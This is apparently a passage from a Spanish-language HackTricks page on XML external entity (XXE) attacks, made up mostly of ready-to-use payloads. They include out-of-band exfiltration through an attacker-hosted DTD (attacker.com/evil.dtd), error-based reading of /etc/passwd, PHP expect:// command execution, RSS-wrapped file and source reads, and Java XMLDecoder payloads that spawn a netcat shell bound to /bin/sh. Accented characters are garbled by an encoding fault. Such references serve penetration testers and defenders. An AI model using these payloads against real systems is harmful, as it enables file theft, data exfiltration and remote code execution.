#### **Extraer recurso externo**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Ejecuci칩n de c칩digo remoto

**Si el m칩dulo "expect" de PHP est치 cargado**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Esta secci칩n fue tomada de [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
Seg칰n la [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) es un formato de bitexto basado en XML creado para estandarizar la forma en que se pasan datos localizables entre y entre herramientas durante un proceso de localizaci칩n y un formato com칰n para el intercambio de herramientas CAT.

### Solicitud ciega
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
El servidor responde con un error:
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Pero obtuvimos una respuesta en Burp Collaborator.

### Exfiltraci칩n de datos a trav칠s de Out of Band
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Bas치ndose en el User Agent mostrado devuelto por Burp Collaborator, parece que est치 utilizando **Java 1.8**. Uno de los problemas al explotar XXE en esta versi칩n de Java es **que no podemos obtener los archivos que contienen un `Salto de l칤nea`** como `/etc/passwd` utilizando la t칠cnica Out of Band.

### Exfiltrando Datos a trav칠s de Errores Basados en

Archivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Respuesta del servidor:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Excelente! El archivo `non-exist` se refleja en los mensajes de error. A continuaci칩n se agrega el Contenido del Archivo.

Archivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Y el contenido del archivo se **imprimi칩 con 칠xito en la salida del error enviado a trav칠s de HTTP**.

## RSS - XEE

XML v치lido con formato RSS para explotar una vulnerabilidad de XXE.

### Ping back

Solicitud HTTP simple al servidor de los atacantes
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leer archivo

El atacante puede utilizar una entidad externa XML para leer archivos del sistema de archivos del servidor. Por ejemplo, el siguiente XML puede ser utilizado para leer el archivo `/etc/passwd`:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leer c칩digo fuente

Usando el filtro base64 de PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder es una clase de Java que crea objetos basados en un mensaje XML. Si un usuario malintencionado puede hacer que una aplicaci칩n utilice datos arbitrarios en una llamada al m칠todo **readObject**, obtendr치 instant치neamente la ejecuci칩n de c칩digo en el servidor.

### Utilizando Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

El `ProcessBuilder` es una clase en Java que se utiliza para crear procesos nativos del sistema operativo. Permite a los desarrolladores ejecutar comandos en el sistema operativo subyacente desde una aplicaci칩n Java.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Herramientas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## M치s recursos

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extraer informaci칩n a trav칠s de HTTP utilizando su propio DTD externo: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
